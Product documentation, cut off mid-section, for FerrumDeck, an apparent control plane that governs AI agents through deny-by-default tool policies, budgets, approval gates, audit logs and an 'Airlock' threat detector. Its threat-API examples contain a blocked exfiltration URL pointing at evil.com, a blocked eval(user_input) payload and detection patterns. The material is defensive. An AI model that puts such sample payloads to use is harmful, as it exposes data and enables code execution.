# FerrumDeck - Complete Product Documentation

## Production-Grade AgentOps Control Plane

**Version**: 0.1.0
**Last Updated**: January 2026

---

# Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Architecture Overview](#2-architecture-overview)
3. [Control Plane (Rust)](#3-control-plane-rust)
4. [Data Plane (Python)](#4-data-plane-python)
5. [Dashboard (Next.js)](#5-dashboard-nextjs)
6. [Database Schema](#6-database-schema)
7. [API Reference](#7-api-reference)
8. [Security Model](#8-security-model)
9. [Evaluation Framework](#9-evaluation-framework)
10. [Deployment Guide](#10-deployment-guide)
11. [Configuration Reference](#11-configuration-reference)
12. [Example Agents](#12-example-agents)
13. [Observability](#13-observability)
14. [Development Guide](#14-development-guide)

---

# 1. Executive Summary

## What is FerrumDeck?

FerrumDeck is a **production-grade AgentOps Control Plane** for running agentic AI workflows with deterministic governance. It provides enterprise-level controls for AI agent operations including:

- **Deny-by-default tool policies** with approval gates
- **Budget enforcement** (tokens, cost, time, tool calls)
- **Immutable audit trail** for compliance
- **MCP router** for secure tool execution
- **Real-time monitoring** dashboard
- **Evaluation framework** for agent testing

## Core Value Propositions

| Capability | Description |
|------------|-------------|
| **Governance** | Every tool call is policy-checked; sensitive operations require human approval |
| **Cost Control** | Per-run budgets prevent runaway costs; configurable limits at agent and tenant level |
| **Auditability** | Complete trace of every decision, with PII redaction and immutable logs |
| **Observability** | OpenTelemetry integration with GenAI semantic conventions |
| **Extensibility** | MCP-based tool ecosystem; custom scorers for evaluation |

## Technology Stack

| Layer | Technology | Purpose |
|-------|------------|---------|
| Control Plane | Rust + Axum | Policy engine, orchestration, API gateway |
| Data Plane | Python + litellm | LLM execution, tool calls, MCP routing |
| Dashboard | Next.js 16 + React 19 | Admin UI, real-time monitoring |
| Database | PostgreSQL + pgvector | Persistent storage, vector search |
| Queue | Redis Streams | Job queue with consumer groups |
| Tracing | OpenTelemetry + Jaeger | Distributed tracing |

---

# 2. Architecture Overview

## High-Level System Architecture

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                              CLIENTS                                         │
│  Dashboard  │  API Clients  │  CLI (fd-cli)  │  External Systems           │
└─────────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│                         CONTROL PLANE (Rust)                                 │
│  ┌───────────┐  ┌─────────────┐  ┌──────────┐  ┌───────────┐              │
│  │  Gateway  │  │   Policy    │  │  Budget  │  │   Audit   │              │
│  │  (Axum)   │  │   Engine    │  │ Enforcer │  │  Logger   │              │
│  └─────┬─────┘  └──────┬──────┘  └────┬─────┘  └─────┬─────┘              │
│        │               │               │               │                    │
│        └───────────────┴───────────────┴───────────────┘                    │
│                                │                                            │
│  ┌───────────────────────────────────────────────────────────────────────┐  │
│  │                       PostgreSQL + Redis                               │  │
│  └───────────────────────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────────────┘
                                    │
                              Redis Queue
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│                          DATA PLANE (Python)                                 │
│  ┌──────────────┐  ┌───────────────┐  ┌───────────────┐  ┌──────────────┐ │
│  │    Worker    │  │  LLM Executor │  │  MCP Router   │  │   Sandbox    │ │
│  │              │  │   (litellm)   │  │ (deny-default)│  │              │ │
│  └──────────────┘  └───────────────┘  └───────────────┘  └──────────────┘ │
│                                │                                           │
│                    ┌───────────┴───────────┐                               │
│                    │     MCP Servers       │                               │
│                    │  GitHub │ Git │ Test  │                               │
│                    └───────────────────────┘                               │
└─────────────────────────────────────────────────────────────────────────────┘
```

## Data Flow

### Run Creation Flow

```
1. Client → POST /v1/runs (agent_id, input)
2. Gateway → Authenticate (API Key / JWT)
3. Gateway → Rate limit check
4. Gateway → Resolve agent and version
5. Gateway → Initial budget check
6. Gateway → Create run record (status: Created)
7. Gateway → Audit event (run.created)
8. Gateway → Create first LLM step
9. Gateway → Update run (status: Queued)
10. Gateway → Enqueue StepJob to Redis
11. Return → 201 Created with run details
```

### Step Execution Flow

```
1. Worker → Dequeue StepJob from Redis
2. Worker → Execute step (LLM call or tool)
3. Worker → POST /v1/runs/{id}/steps/{id}
4. Gateway → Update step (status, output, tokens)
5. Gateway → Calculate cost
6. Gateway → Increment run usage atomically
7. Gateway → Check budget limits
8. Gateway → Audit event (step.completed)
9. If budget exceeded → Kill run
10. If more steps needed → Create next step
11. If complete → Mark run completed
```

### Tool Policy Check Flow

```
1. Worker → Before executing tool
2. Worker → POST /v1/runs/{id}/check-tool
3. Gateway → Evaluate against PolicyEngine
   - Check denied_tools (highest priority)
   - Check approval_required
   - Check allowed_tools
   - Default: DENY
4. Gateway → Audit policy decision
5. If denied → Block execution, update run
6. If requires_approval → Create ApprovalRequest
7. If allowed → Return allowed=true
```

## Directory Structure

```
ferrumdeck/
├── rust/                     # Control Plane
│   ├── crates/               # Shared libraries
│   │   ├── fd-core/          # IDs, config, errors, time
│   │   ├── fd-storage/       # PostgreSQL + Redis
│   │   ├── fd-policy/        # Policy engine, budgets
│   │   ├── fd-registry/      # Agent/tool versioning
│   │   ├── fd-audit/         # Audit logging, redaction
│   │   ├── fd-dag/           # DAG scheduler
│   │   └── fd-otel/          # OpenTelemetry
│   └── services/
│       └── gateway/          # Axum HTTP API
│
├── python/                   # Data Plane
│   └── packages/
│       ├── fd-runtime/       # Core runtime library
│       ├── fd-worker/        # Queue consumer
│       ├── fd-mcp-router/    # MCP tool routing
│       ├── fd-mcp-tools/     # MCP server implementations
│       ├── fd-evals/         # Evaluation framework
│       └── fd-cli/           # CLI tool
│
├── nextjs/                   # Dashboard
│   ├── src/app/              # App Router pages
│   ├── src/components/       # React components
│   ├── src/hooks/            # Custom hooks
│   ├── src/lib/              # API client, utilities
│   └── src/types/            # TypeScript interfaces
│
├── db/migrations/            # SQL migrations
├── contracts/                # API contracts
│   ├── openapi/              # OpenAPI specs
│   └── jsonschema/           # JSON schemas
├── config/                   # Configuration files
├── deploy/docker/            # Docker Compose
├── evals/                    # Evaluation configs
├── examples/                 # Example agents
└── docs/                     # Documentation
```

---

# 3. Control Plane (Rust)

## Overview

The Rust control plane is the **authoritative source of truth** for agent orchestration. It handles:
- HTTP API (Axum web framework)
- Policy evaluation (deny-by-default)
- Budget tracking and enforcement
- Audit logging with PII redaction
- Job queue management (Redis Streams)

## Crate Architecture

### fd-core (Core Primitives)

**Location**: `rust/crates/fd-core/`

Provides foundational types used across all crates.

#### ID System (ULID-based)

```rust
// Strongly-typed IDs with prefixes
define_id!(RunId, "run");   // run_01HGXK...
define_id!(StepId, "stp");  // stp_01HGXK...
define_id!(AgentId, "agt"); // agt_01HGXK...
define_id!(ToolId, "tol");  // tol_01HGXK...
define_id!(TenantId, "ten"); // ten_01HGXK...
```

**Features**:
- Time-ordered (ULID includes timestamp)
- Type-safe (cannot mix up ID types)
- Human-readable prefixes
- Bi-directional parsing

#### Error Types

```rust
#[derive(Debug, thiserror::Error)]
pub enum Error {
    #[error("not found: {entity} with id {id}")]
    NotFound { entity: &'static str, id: String },

    #[error("policy denied: {reason}")]
    PolicyDenied { reason: String, rule_id: Option<String> },

    #[error("budget exceeded: {resource} limit of {limit} reached")]
    BudgetExceeded { resource: String, limit: String },

    #[error("approval required for action: {action}")]
    ApprovalRequired { action: String, request_id: String },
    // ... more error types
}
```

### fd-storage (Database Layer)

**Location**: `rust/crates/fd-storage/`

Provides PostgreSQL repositories and Redis queue operations.

#### Repository Pattern

```rust
pub struct RunsRepo { pool: DbPool }

impl RunsRepo {
    pub async fn create(&self, run: CreateRun) -> Result<Run, sqlx::Error>;
    pub async fn get(&self, id: &str) -> Result<Option<Run>, sqlx::Error>;
    pub async fn update_status(&self, id: &str, status: RunStatus) -> Result<...>;
    pub async fn increment_usage(&self, id: &str, tokens: i32, cost: i32) -> Result<()>;
}
```

Available repositories:
- `RunsRepo` - Run lifecycle
- `StepsRepo` - Step operations
- `AgentsRepo` - Agent registry
- `ToolsRepo` - Tool registry
- `PoliciesRepo` - Policy rules
- `AuditRepo` - Audit events
- `WorkflowsRepo` - Workflow definitions

#### Redis Queue

```rust
pub struct QueueClient {
    conn: MultiplexedConnection,
}

impl QueueClient {
    pub async fn enqueue<T>(&self, queue: &str, message: &T) -> Result<String>;
    pub async fn dequeue<T>(&self, queue: &str, count: usize) -> Result<Vec<T>>;
    pub async fn ack(&self, queue: &str, stream_id: &str) -> Result<()>;
}
```

### fd-policy (Policy Engine)

**Location**: `rust/crates/fd-policy/`

Implements **deny-by-default** policy enforcement.

#### Tool Allowlist

```rust
#[derive(Default)]
pub struct ToolAllowlist {
    pub allowed_tools: Vec<String>,      // Execute immediately
    pub approval_required: Vec<String>,  // Need human approval
    pub denied_tools: Vec<String>,       // Explicitly blocked
}

impl ToolAllowlist {
    pub fn check(&self, tool_name: &str) -> ToolAllowlistResult {
        // Priority: denied > approval_required > allowed > DENY
    }
}
```

#### Budget Tracking

```rust
#[derive(Clone)]
pub struct Budget {
    pub max_input_tokens: Option<u64>,    // Default: 100,000
    pub max_output_tokens: Option<u64>,   // Default: 50,000
    pub max_total_tokens: Option<u64>,    // Default: 150,000
    pub max_tool_calls: Option<u32>,      // Default: 50
    pub max_wall_time_ms: Option<u64>,    // Default: 5 minutes
    pub max_cost_cents: Option<u64>,      // Default: $5.00
}

#[derive(Default)]
pub struct BudgetUsage {
    pub input_tokens: u64,
    pub output_tokens: u64,
    pub tool_calls: u32,
    pub wall_time_ms: u64,
    pub cost_cents: u64,
}
```

### fd-audit (Audit Logging)

**Location**: `rust/crates/fd-audit/`

Provides immutable audit logging with PII redaction.

#### Sensitive Data Redaction

Automatically redacts:
- API keys and tokens
- AWS credentials
- Database connection strings
- Email addresses
- Credit card numbers
- SSN (US format)
- Password fields
- Private keys

```rust
pub fn redact_json(value: &Value) -> Value {
    // Recursively redacts sensitive fields and values
}
```

### fd-dag (Workflow Scheduler)

**Location**: `rust/crates/fd-dag/`

Implements DAG-based workflow orchestration.

```rust
pub struct WorkflowDag {
    steps: HashMap<String, StepDefinition>,
    children: HashMap<String, Vec<String>>,
    parents: HashMap<String, Vec<String>>,
    topological_order: Vec<String>,
}

pub struct DagScheduler {
    dag: WorkflowDag,
    step_status: HashMap<String, StepStatus>,
}

impl DagScheduler {
    pub fn get_ready_steps(&self) -> Vec<String>;
    pub fn complete_step(&mut self, step_id: &str) -> StepCompletionResult;
    pub fn evaluate_condition(&self, expr: &str) -> bool;
}
```

### Gateway Service

**Location**: `rust/services/gateway/`

Axum-based HTTP API with middleware stack.

#### Route Structure

```rust
Router::new()
    .route("/health", get(health_check))
    .route("/ready", get(readiness_check))
    .nest("/v1", Router::new()
        // Runs
        .route("/runs", post(create_run).get(list_runs))
        .route("/runs/{run_id}", get(get_run))
        .route("/runs/{run_id}/cancel", post(cancel_run))
        .route("/runs/{run_id}/steps", get(list_steps))
        .route("/runs/{run_id}/check-tool", post(check_tool_policy))

        // Approvals
        .route("/approvals", get(list_approvals))
        .route("/approvals/{id}", put(resolve_approval))

        // Registry
        .route("/registry/agents", get(list_agents).post(create_agent))
        .route("/registry/tools", get(list_tools).post(create_tool))

        // Policies
        .route("/policies", get(list_policies).post(create_policy))

        // Workflows
        .route("/workflows", get(list_workflows).post(create_workflow))
        .route("/workflow-runs", post(create_workflow_run))

        .layer(rate_limit_middleware)
        .layer(auth_middleware)
    )
```

#### Authentication Middleware

Supports two methods:
1. **API Key**: `Authorization: Bearer <api_key>`
2. **OAuth2/JWT**: If enabled, JWT validation first

```rust
pub struct AuthContext {
    pub api_key_id: String,
    pub tenant_id: String,
    pub scopes: Vec<String>,
}
```

#### Rate Limiting

Per-tenant sliding window rate limiting:
- Default: 100 requests/minute
- Configurable via `RATE_LIMIT_PER_MINUTE`
- Headers: `X-RateLimit-Limit`, `X-RateLimit-Remaining`, `X-RateLimit-Reset`

---

# 4. Data Plane (Python)

## Overview

The Python data plane handles **execution** of agent steps:
- LLM calls via litellm
- Tool execution via MCP
- Policy compliance checks
- Retry with exponential backoff

## Package Architecture

### fd-runtime (Core Library)

**Location**: `python/packages/fd-runtime/`

#### Data Models

```python
class RunStatus(str, Enum):
    CREATED = "created"
    QUEUED = "queued"
    RUNNING = "running"
    WAITING_APPROVAL = "waiting_approval"
    COMPLETED = "completed"
    FAILED = "failed"
    BUDGET_KILLED = "budget_killed"
    POLICY_BLOCKED = "policy_blocked"

class Budget(BaseModel):
    max_input_tokens: int | None = 100_000
    max_output_tokens: int | None = 50_000
    max_tool_calls: int | None = 50
    max_wall_time_ms: int | None = 300_000  # 5 min
    max_cost_cents: int | None = 500  # $5
```

#### OpenTelemetry Tracing

```python
# GenAI Semantic Conventions
GEN_AI_SYSTEM = "gen_ai.system"
GEN_AI_REQUEST_MODEL = "gen_ai.request.model"
GEN_AI_USAGE_INPUT_TOKENS = "gen_ai.usage.input_tokens"
GEN_AI_USAGE_OUTPUT_TOKENS = "gen_ai.usage.output_tokens"

@contextmanager
def trace_llm_call(model: str, run_id: str | None = None):
    """Trace LLM calls with GenAI semantic conventions."""
```

### fd-worker (Queue Consumer)

**Location**: `python/packages/fd-worker/`

#### LLM Executor

```python
class LLMExecutor:
    async def complete(
        self,
        messages: list[dict],
        model: str = "claude-sonnet-4-20250514",
        tools: list[dict] | None = None,
        temperature: float = 0.7,
    ) -> LLMResponse:
        """Execute LLM completion via litellm."""
```

#### Agentic Executor

```python
class AgenticExecutor:
    """Full agentic loop: LLM → Tool → LLM → ... → Response"""

    async def run(
        self,
        task: str,
        system_prompt: str,
        model: str = "claude-sonnet-4-20250514",
        max_iterations: int = 25,
    ) -> AgenticResult:
        """Run agentic loop until completion."""
```

#### Output Validation (LLM02 Mitigation)

```python
class OutputValidator:
    """Validates LLM outputs before tool execution."""

    # Suspicious patterns detected:
    # - Script tags, eval calls
    # - Template injection
    # - Command execution

    def validate_tool_call(self, tool_name: str, tool_input: dict) -> ValidationResult:
        """Validate tool call extracted from LLM output."""
```

#### Retry Strategy

```python
RETRYABLE_EXCEPTIONS = (
    httpx.ConnectError,
    httpx.ConnectTimeout,
    litellm.RateLimitError,
    litellm.ServiceUnavailableError,
)

@retry(
    retry=retry_if_exception_type(RETRYABLE_EXCEPTIONS),
    stop=stop_after_attempt(3),
    wait=wait_exponential(multiplier=1.0, min=1, max=30),
)
async def execute_with_retry():
    ...
```

### fd-mcp-router (MCP Routing)

**Location**: `python/packages/fd-mcp-router/`

#### Deny-by-Default Allowlist

```python
class ToolAllowlist(BaseModel):
    allowed_tools: list[str] = []       # Always allowed
    approval_required: list[str] = []   # Need human approval
    denied_tools: list[str] = []        # Explicitly blocked

    def check(self, tool_name: str) -> str:
        """Returns: 'allowed', 'requires_approval', or 'denied'"""
        if tool_name in self.denied_tools:
            return "denied"
        if tool_name in self.approval_required:
            return "requires_approval"
        if tool_name in self.allowed_tools:
            return "allowed"
        return "denied"  # DENY BY DEFAULT
```

#### MCP Router

```python
class MCPRouter:
    async def call_tool(
        self,
        tool_name: str,
        tool_input: dict,
        run_id: str | None = None,
    ) -> ToolResult:
        """Call a tool through the router with policy check."""
```

### fd-mcp-tools (MCP Servers)

**Location**: `python/packages/fd-mcp-tools/`

#### Git MCP Server

Entry point: `fd-mcp-git`

Tools:
- `git_clone`, `git_status`, `git_diff`, `git_log`
- `git_add`, `git_commit`, `git_push`
- `git_checkout`, `git_branch`

#### Test Runner MCP Server

Entry point: `fd-mcp-test-runner`

Tools:
- `run_pytest`, `run_jest`, `run_cargo_test`
- `check_lint`, `check_types`

---

# 5. Dashboard (Next.js)

## Overview

Professional "Mission Control" admin UI built with:
- Next.js 16+ App Router
- React 19
- TanStack Query for server state
- Tailwind CSS 4 with dark theme
- shadcn/ui components

## Page Structure

| Route | Purpose |
|-------|---------|
| `/overview` | Dashboard with KPIs |
| `/runs` | Run list with filters |
| `/runs/[id]` | Run detail with step timeline |
| `/threats` | Airlock security violations |
| `/approvals` | Approval queue |
| `/agents` | Agent registry |
| `/agents/[id]` | Agent detail and versions |
| `/tools` | Tool registry |
| `/policies` | Policy management |
| `/analytics` | Usage charts |
| `/audit` | Audit log viewer |
| `/logs` | Container logs |
| `/settings` | Configuration (includes Airlock settings) |

## BFF Pattern

All `/api/v1/*` routes proxy to the gateway:

```typescript
// app/api/v1/runs/route.ts
export async function GET(request: NextRequest) {
  const response = await fetch(`${GATEWAY_URL}/api/v1/runs`, {
    headers: { Authorization: `Bearer ${API_KEY}` },
  });
  return NextResponse.json(await response.json());
}
```

## Data Fetching

```typescript
// Polling for real-time updates
export function useRuns() {
  return useQuery({
    queryKey: ["runs"],
    queryFn: fetchRuns,
    refetchInterval: 2000,  // 2s polling
  });
}

// Conditional polling
export function useRun(runId: string) {
  return useQuery({
    queryKey: ["run", runId],
    queryFn: () => fetchRun(runId),
    refetchInterval: (query) => {
      const status = query.state.data?.status;
      const terminal = ["completed", "failed", "cancelled"];
      return terminal.includes(status) ? false : 2000;
    },
  });
}
```

### Security Hooks

```typescript
// List threats with filtering and polling
export function useThreats(filters?: ThreatFilters) {
  return useQuery({
    queryKey: ["threats", filters],
    queryFn: () => fetchThreats(filters),
    refetchInterval: 5000,  // 5s polling
  });
}

// Get single threat
export function useThreat(threatId: string) {
  return useQuery({
    queryKey: ["threat", threatId],
    queryFn: () => fetchThreat(threatId),
  });
}

// Threats for a specific run
export function useRunThreats(runId: string) {
  return useQuery({
    queryKey: ["run-threats", runId],
    queryFn: () => fetchThreats({ run_id: runId }),
  });
}

// Threat summary for a run
export function useRunThreatSummary(runId: string) {
  return useQuery({
    queryKey: ["run-threat-summary", runId],
    queryFn: () => fetchThreatSummary(runId),
  });
}

// Airlock configuration
export function useAirlockConfig() {
  return useQuery({
    queryKey: ["airlock-config"],
    queryFn: fetchAirlockConfig,
  });
}

// Update Airlock mode
export function useUpdateAirlockConfig() {
  const queryClient = useQueryClient();
  return useMutation({
    mutationFn: updateAirlockConfig,
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["airlock-config"] });
    },
  });
}

// Toggle shadow/enforce mode
export function useToggleAirlockMode() {
  const { data: config } = useAirlockConfig();
  const updateConfig = useUpdateAirlockConfig();

  return () => {
    const newMode = config?.mode === "shadow" ? "enforce" : "shadow";
    updateConfig.mutate({ mode: newMode });
  };
}
```

### Security Components

| Component | Purpose |
|-----------|---------|
| `ThreatTable` | Paginated threat list with filtering |
| `ThreatFilters` | Risk level, violation type, action filters |
| `SecurityBadge` | Color-coded risk level indicator |
| `SecurityDetailSection` | Threat details in run detail view |
| `ThreatCountBadge` | Threat count badge for runs |
| `ThreatSummaryPopover` | Quick threat summary on hover |
| `BlockedContentViewer` | View blocked payload with syntax highlighting |
| `AirlockSettingsCard` | Toggle shadow/enforce mode in settings |

## Theme

Mission Control dark theme:

```css
:root {
  --background: #06080c;          /* Deep black */
  --foreground: #f0f4f8;          /* Crisp white */
  --accent-primary: #00d4ff;      /* Electric cyan */
  --accent-green: #00ff88;        /* Neon green (success) */
  --accent-yellow: #ffb800;       /* Amber (running) */
  --accent-red: #ff3d3d;          /* Hot red (error) */
  --accent-purple: #a855f7;       /* Purple (approval) */
}
```

---

# 6. Database Schema

## Entity Relationship

```
┌──────────┐    ┌────────────┐    ┌──────────┐
│ Tenants  │───<│ Workspaces │───<│ Projects │
└──────────┘    └────────────┘    └────┬─────┘
                                       │
                    ┌──────────────────┼──────────────────┐
                    │                  │                  │
              ┌─────▼─────┐     ┌──────▼──────┐    ┌──────▼──────┐
              │  Agents   │     │    Runs     │    │   Tools     │
              └─────┬─────┘     └──────┬──────┘    └──────┬──────┘
                    │                  │                  │
           ┌────────▼────────┐  ┌──────▼──────┐   ┌───────▼───────┐
           │ Agent Versions  │  │   Steps     │   │ Tool Versions │
           └─────────────────┘  └──────┬──────┘   └───────────────┘
                                       │
                          ┌────────────┼────────────┐
                          │            │            │
                   ┌──────▼──────┐ ┌───▼────┐ ┌─────▼─────┐
                   │ Approvals   │ │Artifacts│ │  Audit    │
                   └─────────────┘ └────────┘ │  Events   │
                                              └───────────┘
```

## Core Tables

### tenants
Multi-tenancy root entity.

```sql
CREATE TABLE tenants (
    id TEXT PRIMARY KEY,        -- ten_xxxxx
    name TEXT NOT NULL,
    slug TEXT NOT NULL UNIQUE,
    settings JSONB DEFAULT '{}',
    created_at TIMESTAMPTZ DEFAULT NOW(),
    updated_at TIMESTAMPTZ DEFAULT NOW()
);
```

### runs
Agent execution instances.

```sql
CREATE TABLE runs (
    id TEXT PRIMARY KEY,              -- run_xxxxx
    project_id TEXT NOT NULL,
    agent_version_id TEXT NOT NULL,
    input JSONB NOT NULL,
    config JSONB DEFAULT '{}',
    status run_status DEFAULT 'created',
    status_reason TEXT,
    input_tokens INTEGER DEFAULT 0,
    output_tokens INTEGER DEFAULT 0,
    tool_calls INTEGER DEFAULT 0,
    cost_cents INTEGER DEFAULT 0,
    output JSONB,
    error JSONB,
    trace_id TEXT,
    created_at TIMESTAMPTZ DEFAULT NOW(),
    started_at TIMESTAMPTZ,
    completed_at TIMESTAMPTZ
);

CREATE TYPE run_status AS ENUM (
    'created', 'queued', 'running', 'waiting_approval',
    'completed', 'failed', 'cancelled', 'timeout',
    'budget_killed', 'policy_blocked'
);
```

### steps
Individual execution steps.

```sql
CREATE TABLE steps (
    id TEXT PRIMARY KEY,              -- stp_xxxxx
    run_id TEXT NOT NULL,
    parent_step_id TEXT,
    step_number INTEGER NOT NULL,
    step_type step_type NOT NULL,
    status step_status DEFAULT 'pending',
    input JSONB NOT NULL,
    output JSONB,
    tool_name TEXT,
    model TEXT,
    input_tokens INTEGER,
    output_tokens INTEGER,
    error JSONB,
    span_id TEXT,
    created_at TIMESTAMPTZ DEFAULT NOW(),
    completed_at TIMESTAMPTZ
);

CREATE TYPE step_type AS ENUM ('llm', 'tool', 'retrieval', 'human');
CREATE TYPE step_status AS ENUM (
    'pending', 'running', 'waiting_approval',
    'completed', 'failed', 'skipped'
);
```

### approval_requests
Human approval gates.

```sql
CREATE TABLE approval_requests (
    id TEXT PRIMARY KEY,              -- apr_xxxxx
    run_id TEXT NOT NULL,
    step_id TEXT NOT NULL,
    policy_decision_id TEXT NOT NULL,
    action_type TEXT NOT NULL,
    action_details JSONB NOT NULL,
    reason TEXT NOT NULL,
    status approval_status DEFAULT 'pending',
    resolved_by TEXT,
    resolved_at TIMESTAMPTZ,
    resolution_note TEXT,
    created_at TIMESTAMPTZ DEFAULT NOW(),
    expires_at TIMESTAMPTZ
);

CREATE TYPE approval_status AS ENUM ('pending', 'approved', 'rejected', 'expired');
```

### tenant_quotas
Per-tenant limits.

```sql
CREATE TABLE tenant_quotas (
    tenant_id TEXT PRIMARY KEY,
    monthly_input_token_limit BIGINT,
    monthly_output_token_limit BIGINT,
    monthly_cost_limit_cents BIGINT,
    daily_run_limit INT,
    concurrent_run_limit INT DEFAULT 10,
    requests_per_minute INT DEFAULT 1000,
    max_cost_per_run_cents INT DEFAULT 500,
    max_tokens_per_run INT DEFAULT 100000
);
```

### threats
Security violations detected by Airlock inspector.

```sql
CREATE TABLE threats (
    id TEXT PRIMARY KEY,              -- thr_xxxxx
    run_id TEXT NOT NULL REFERENCES runs(id),
    step_id TEXT REFERENCES steps(id),
    tool_name TEXT NOT NULL,
    risk_score INTEGER NOT NULL CHECK (risk_score >= 0 AND risk_score <= 100),
    risk_level TEXT NOT NULL CHECK (risk_level IN ('low', 'medium', 'high', 'critical')),
    violation_type TEXT NOT NULL CHECK (violation_type IN (
        'rce_pattern', 'velocity_breach', 'loop_detection',
        'exfiltration_attempt', 'ip_address_used'
    )),
    violation_details TEXT NOT NULL,
    blocked_payload JSONB,            -- The payload that was blocked
    trigger_pattern TEXT,             -- Pattern that triggered detection
    action TEXT NOT NULL DEFAULT 'logged' CHECK (action IN ('blocked', 'logged')),
    shadow_mode BOOLEAN NOT NULL DEFAULT true,
    created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

-- Indexes for efficient querying
CREATE INDEX idx_threats_run_id ON threats(run_id);
CREATE INDEX idx_threats_risk_level ON threats(risk_level);
CREATE INDEX idx_threats_created_at ON threats(created_at DESC);
CREATE INDEX idx_threats_critical_recent ON threats(risk_level, created_at DESC)
    WHERE risk_level = 'critical';
```

### velocity_events
Tool call velocity tracking for circuit breaker.

```sql
CREATE TABLE velocity_events (
    id SERIAL PRIMARY KEY,
    run_id TEXT NOT NULL,
    tool_name TEXT NOT NULL,
    tool_input_hash TEXT NOT NULL,    -- SHA256 of tool input
    cost_cents INTEGER NOT NULL DEFAULT 0,
    created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

-- Index for velocity window queries
CREATE INDEX idx_velocity_events_run_created
    ON velocity_events(run_id, created_at DESC);

-- Cleanup function (retain 1 hour of data)
CREATE OR REPLACE FUNCTION cleanup_velocity_events()
RETURNS void AS $$
BEGIN
    DELETE FROM velocity_events
    WHERE created_at < NOW() - INTERVAL '1 hour';
END;
$$ LANGUAGE plpgsql;
```

### Schema Extensions

Additional columns added to existing tables:

```sql
-- runs table extension
ALTER TABLE runs ADD COLUMN threat_count INTEGER NOT NULL DEFAULT 0;

-- Trigger to auto-update threat_count
CREATE OR REPLACE FUNCTION update_run_threat_count()
RETURNS TRIGGER AS $$
BEGIN
    UPDATE runs SET threat_count = (
        SELECT COUNT(*) FROM threats WHERE run_id = NEW.run_id
    ) WHERE id = NEW.run_id;
    RETURN NEW;
END;
$$ LANGUAGE plpgsql;

CREATE TRIGGER trigger_update_threat_count
    AFTER INSERT ON threats
    FOR EACH ROW EXECUTE FUNCTION update_run_threat_count();
```

---

# 7. API Reference

## Authentication

All `/v1/*` endpoints require authentication:

```
Authorization: Bearer <api_key>
Authorization: ApiKey <api_key>
```

## Endpoints Summary

| Method | Endpoint | Description |
|--------|----------|-------------|
| `GET` | `/health` | Liveness probe |
| `GET` | `/ready` | Readiness probe |
| `POST` | `/v1/runs` | Create new run |
| `GET` | `/v1/runs` | List runs |
| `GET` | `/v1/runs/{id}` | Get run |
| `POST` | `/v1/runs/{id}/cancel` | Cancel run |
| `GET` | `/v1/runs/{id}/steps` | List steps |
| `POST` | `/v1/runs/{id}/steps/{stepId}` | Submit step result |
| `POST` | `/v1/runs/{id}/check-tool` | Check tool policy |
| `GET` | `/v1/approvals` | List pending approvals |
| `PUT` | `/v1/approvals/{id}` | Resolve approval |
| `GET` | `/v1/registry/agents` | List agents |
| `POST` | `/v1/registry/agents` | Create agent |
| `GET` | `/v1/registry/agents/{id}/versions` | List versions |
| `POST` | `/v1/registry/agents/{id}/versions` | Create version |
| `GET` | `/v1/registry/tools` | List tools |
| `POST` | `/v1/registry/tools` | Create tool |
| `GET` | `/v1/policies` | List policies |
| `POST` | `/v1/policies` | Create policy |
| `GET` | `/v1/workflows` | List workflows |
| `POST` | `/v1/workflow-runs` | Create workflow run |
| `GET` | `/v1/security/threats` | List security threats |
| `GET` | `/v1/security/threats/{id}` | Get threat details |
| `GET` | `/v1/security/config` | Get Airlock configuration |
| `PUT` | `/v1/security/config` | Update Airlock mode |

## Example: Create Run

**Request**:
```http
POST /v1/runs
Content-Type: application/json
Authorization: Bearer fd_live_xxxxx

{
  "agent_id": "safe-pr-agent",
  "input": {
    "task": "Review PR #123",
    "repo": "org/repo"
  }
}
```

**Response** (201):
```json
{
  "id": "run_01HGXK...",
  "status": "queued",
  "agent_version_id": "agv_01HGXK...",
  "input": {...},
  "cost_cents": 0,
  "created_at": "2024-01-15T10:30:00Z"
}
```

## Error Responses

```json
{
  "error": {
    "code": "POLICY_DENIED",
    "message": "Tool 'delete_file' is not on allowlist"
  }
}
```

| Code | Status | Description |
|------|--------|-------------|
| `NOT_FOUND` | 404 | Resource not found |
| `BAD_REQUEST` | 400 | Invalid request |
| `POLICY_DENIED` | 403 | Tool blocked by policy |
| `BUDGET_EXCEEDED` | 403 | Budget limits reached |
| `UNAUTHORIZED` | 401 | Authentication failed |
| `RATE_LIMITED` | 429 | Rate limit exceeded |
| `INTERNAL_ERROR` | 500 | Server error |

## Security Endpoints

### List Threats

**Request**:
```http
GET /v1/security/threats?risk_level=critical&action=blocked&limit=20
Authorization: Bearer fd_live_xxxxx
```

**Query Parameters**:
| Parameter | Type | Description |
|-----------|------|-------------|
| `run_id` | string | Filter by run ID |
| `risk_level` | string | Filter by level: low, medium, high, critical |
| `violation_type` | string | Filter by type: rce_pattern, velocity_breach, etc. |
| `action` | string | Filter by action: blocked, logged |
| `limit` | integer | Max results (default: 50) |
| `offset` | integer | Pagination offset |

**Response** (200):
```json
{
  "threats": [
    {
      "id": "thr_01HGXK...",
      "run_id": "run_01HGXK...",
      "step_id": "stp_01HGXK...",
      "tool_name": "write_file",
      "risk_score": 90,
      "risk_level": "critical",
      "violation_type": "rce_pattern",
      "violation_details": "Dangerous pattern detected: eval() call",
      "blocked_payload": {"content": "eval(user_input)"},
      "trigger_pattern": "eval\\s*\\(",
      "action": "blocked",
      "shadow_mode": false,
      "created_at": "2024-01-15T10:30:00Z"
    }
  ],
  "total": 1,
  "limit": 20,
  "offset": 0
}
```

### Get Threat Details

**Request**:
```http
GET /v1/security/threats/thr_01HGXK...
Authorization: Bearer fd_live_xxxxx
```

**Response** (200):
```json
{
  "id": "thr_01HGXK...",
  "run_id": "run_01HGXK...",
  "step_id": "stp_01HGXK...",
  "tool_name": "http_get",
  "risk_score": 80,
  "risk_level": "critical",
  "violation_type": "exfiltration_attempt",
  "violation_details": "Unauthorized destination: evil.com not in allowlist",
  "blocked_payload": {"url": "https://evil.com/steal?data=secret"},
  "trigger_pattern": "domain_not_whitelisted",
  "action": "blocked",
  "shadow_mode": false,
  "created_at": "2024-01-15T10:30:00Z"
}
```

### Get Airlock Configuration

**Request**:
```http
GET /v1/security/config
